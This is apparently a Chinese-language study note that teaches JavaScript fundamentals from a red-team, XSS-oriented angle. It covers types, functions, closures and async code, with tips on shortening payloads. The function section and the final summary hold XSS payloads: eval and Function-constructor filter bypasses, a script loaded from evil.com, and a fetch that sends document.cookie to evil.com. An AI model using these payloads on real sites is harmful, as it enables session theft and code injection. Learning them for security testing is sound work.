## 目录

- [[#一、变量与数据类型|一、变量与数据类型]]
- [[#二、运算符与表达式|二、运算符与表达式]]
- [[#三、控制流|三、控制流]]
- [[#四、函数|四、函数]]
- [[#五、对象与JSON|五、对象与JSON]]
- [[#六、数组操作|六、数组操作]]
- [[#七、作用域与闭包|七、作用域与闭包]]
- [[#八、异步编程|八、异步编程]]
- [[#九、红队视角总结|九、红队视角总结]]

---

## 一、变量与数据类型

### 声明方式

```javascript
var oldScoped = 1; // 函数作用域，不推荐
let blockScoped = 2; // 块作用域，推荐
const immutable = 3; // 常量（但对象属性可变）

// var的坑：变量提升(hoisting)
console.log(x); // undefined（不是报错！）
var x = 5;
```

### 数据类型

| 类型 | 示例 | typeof结果 |
|------|------|-----------|
| Number | `42, 3.14, NaN, Infinity` | `"number"` |
| BigInt | `9007199254740991n` | `"bigint"` |
| String | `'hello'`, `` `template` `` | `"string"` |
| Boolean | `true, false` | `"boolean"` |
| Undefined | `undefined` | `"undefined"` |
| Null | `null` | `"object"` (历史bug) |
| Symbol | `Symbol('id')` | `"symbol"` |
| Object | `{name: 'a'}`, `[]`, `function(){}` | `"object"/"function"` |

### 类型转换的坑

```javascript
// 弱类型转换 —— XSS payload常利用这个
[] + [] // "" (空字符串)
[] + {} // "[object Object]"
{} + [] // 0 ({}被解析为空代码块)
1 + "2" // "12" (数字转字符串)
"2" - 1 // 1 (字符串转数字)
!!"false" // true (非空字符串为truthy)
!!0 // false (0为falsy)

// XSS payload常见的精简技巧
alert`` // 等同于 alert("")
(alert)(1) // 括号包裹不影响调用
```

## 二、运算符与表达式

### 常用运算符

```javascript
// 算术
+ - * / % **

// 比较（XSS WAF绕过常用）
== vs === // 宽松比较 vs 严格比较
null == undefined // true
[] == false // true
"0" == false // true

// 逻辑（短路求值常用于精简payload）
&& || !
a && b // a为true则返回b，否则返回a
a || b // a为true则返回a，否则返回b

// 逗号运算符
(1, 2, 3) // 返回3 (常用于混淆)
```

### 三元运算符精简payload

```javascript
// 条件 ? 真值 : 假值
1 ? alert(1) : 0; // alert(1) 执行
0 ? 1 : confirm(1); // confirm(1) 执行

// 嵌套三元实现if-else
a ? (b ? c() : d()) : e()
```

## 三、控制流

```javascript
// 条件
if (condition) { ... }
else if { ... }
else { ... }

// 循环
for (let i = 0; i < 10; i++) { ... }
while (condition) { ... }
do { ... } while (condition);

// 遍历
for (let key in obj) { ... } // 遍历可枚举属性（含原型链）
for (let val of iterable) { ... } // 遍历可迭代对象

// 控制
break; // 跳出循环
continue; // 跳过本次
return; // 函数返回
```

## 四、函数

### 声明与调用

```javascript
// 函数声明（会提升）
function add(a, b) { return a + b; }

// 函数表达式
const add = function(a, b) { return a + b; };

// 箭头函数（无自己的this）
const add = (a, b) => a + b;
const greet = name => `Hello ${name}`;

// 构造函数（危险：eval的亲戚）
const fn = new Function('a', 'b', 'return a + b');
```

### 红队常用函数技巧

```javascript
// Function构造器 —— eval替代品
new Function('alert(1)')();
[].constructor.constructor('alert(1)')(); // 通过数组原型获取Function

// 间接eval
(0, eval)('alert(1)'); // 间接eval（在全局作用域执行）
window['eval']('alert(1)'); // 同上

// setTimeout/setInterval的字符串形式（等于eval）
setTimeout('alert(1)', 0);
setInterval('alert(1)', 1000);

// 利用document.write重写页面
document.write('<script src=//evil.com/exploit.js><\/script>');
```

## 五、对象与JSON

### 对象基础

```javascript
const obj = {
 key1: 'value1',
 key2: 42,
 method() { return this.key1; },
 ['computed']: '动态键名',
};

// 访问方式
obj.key1 // 点号
obj['key1'] // 方括号（支持变量）
obj['__proto__'] // 直接访问原型链
```

### JSON

```javascript
JSON.stringify(obj); // 对象 → JSON字符串
JSON.stringify(obj, null, 2); // 格式化输出
JSON.parse('{"a":1}'); // JSON字符串 → 对象

// 安全关注：JSON.parse 不会执行JS代码！
// 但 JSONP 回调可以：callback({"user":"admin"})
```

### 关键原型方法

```javascript
Object.keys(obj) // 自有可枚举属性
Object.values(obj) // 值
Object.entries(obj) // [key, value]对
Object.getOwnPropertyNames(obj) // 所有自有属性（含不可枚举）
Object.getPrototypeOf(obj) // 获取原型
Object.setPrototypeOf(obj, proto) // 设置原型（危险！）
```

## 六、数组操作

### 常用方法

```javascript
arr.push(x) // 末尾添加
arr.pop() // 末尾移除
arr.shift() // 开头移除
arr.unshift(x) // 开头添加
arr.splice(i, n) // 删除/插入（原地修改）
arr.slice(i, j) // 浅拷贝片段
arr.concat(arr2) // 合并
arr.join(',') // 转为字符串

// 遍历
arr.forEach(x => console.log(x));
arr.map(x => x * 2);
arr.filter(x => x > 5);
arr.reduce((acc, x) => acc + x, 0);
arr.find(x => x > 5);

// 排序
arr.sort((a, b) => a - b); // 数字排序
arr.reverse();

// 包含判断（XSS中有用）
arr.includes(x);
arr.indexOf(x);
```

## 七、作用域与闭包

### 作用域链

```javascript
let global = 'global';

function outer() {
 let outerVar = 'outer';
 
 function inner() {
 let innerVar = 'inner';
 console.log(global, outerVar, innerVar); // 全可访问
 }
 
 inner();
 // console.log(innerVar); // 报错：不可访问
}
```

### 闭包 (Closure)

```javascript
function createCounter() {
 let count = 0; // 闭包捕获的变量
 return function() {
 return ++count; // 即使createCounter执行完，count仍存活
 };
}

const counter = createCounter();
counter(); // 1
counter(); // 2
```

红队应用：闭包可以隐藏恶意代码的上下文，避免变量名冲突。

## 八、异步编程

### Callback

```javascript
setTimeout(() => {
 console.log('async callback');
}, 0);
console.log('sync first'); // 先输出
```

### Promise

```javascript
fetch('https://api.example.com/data')
 .then(response => response.json())
 .then(data => console.log(data))
 .catch(err => console.error(err));
```

### async/await

```javascript
async function getData() {
 try {
 const response = await fetch('https://api.example.com/data');
 const data = await response.json();
 return data;
 } catch (err) {
 console.error(err);
 }
}
```

### Event Loop基础

```
调用栈 → 微任务队列(Promise) → 宏任务队列(setTimeout)
每次清空调用栈后，先执行所有微任务，再执行一个宏任务
```

红队利用：利用事件循环控制payload执行时序。

## 九、红队视角总结

### XSS Payload精简技巧

```javascript
// 短小精悍的payload
onerror=alert(1) // 28 chars
eval(location.hash.slice(1)) // URL hash载入任意JS
eval(atob('YWxlcnQoMSk=')) // base64编码payload
fetch('//evil.com/?c='+document.cookie) // Cookie外泄

// 无字母数字payload（JSFuck风格）
[][(![]+[])[+[]]+...] // 仅用 []!+(){} 表示任意JS
```

### 核心API速查

| API | 用途 | 攻击向量 |
|-----|------|---------|
| `eval()` | 执行字符串 | XSS payload入口 |
| `new Function()` | 同上 | XSS绕过过滤器 |
| `setTimeout()` | 延迟执行 | WAF时序绕过 |
| `document.cookie` | 读写Cookie | Session窃取 |
| `document.write()` | 写入HTML | DOM注入 |
| `window.location` | URL操作 | 重定向钓鱼 |
| `window.name` | 跨页面数据 | 跨域数据传递 |
| `XMLHttpRequest` | HTTP请求 | CSRF/SSRF |
| `fetch()` | 同上 | 同上 + 无CORS限制 |

---
**返回** [[JS基础总目录|JavaScript 总目录]] | [[../前端基础总目录|前端基础总目录]]
